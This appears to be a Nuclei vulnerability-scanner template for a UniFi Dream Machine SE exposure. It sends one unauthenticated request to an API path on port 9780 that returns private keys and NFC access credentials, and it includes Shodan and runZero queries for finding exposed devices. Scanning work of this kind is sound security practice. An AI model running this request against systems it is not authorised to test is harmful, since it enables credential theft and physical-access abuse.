http:
- matchers:
  - condition: and
    dsl:
    - contains_any(body,"google_pass_auth_key","apple_nfc")
    - contains(content_type, "application/json")
    - status_code == 200
    type: dsl
  raw:
  - '@Host: {{Host}}:9780

    GET /api/v1/user_assets/touch_pass/keys HTTP/1.1

    Host: {{Hostname}}

    '
id: unifi-nfc-credentials
info:
  author: DhiyaneshDk
  description: "An unauthenticated GET to /api/v1/user_assets/touch_pass/keys returns\
    \ JSON containing live credential material (PEM private key, Apple NFC/express\
    \ key values, terminal type, TTL, google_pass_auth_key block, version identifiers)\
    \ over a publicly reachable port \u2014 allowing theft and immediate misuse of\
    \ mobile/NFC access credentials.\n"
  metadata:
    max-request: 1
    runzero-match: service["http.body"] matches "(?i)UniFi Dream Machine SE"
    shodan-query: html:"UniFi Dream Machine SE"
    verified: true
  name: UniFi - NFC Credentials
  reference:
  - https://www.catchify.sa/post/cve-2025-52665-rce-in-unifi-os-25-000
  severity: high
  tags: unifi,unauth,vuln
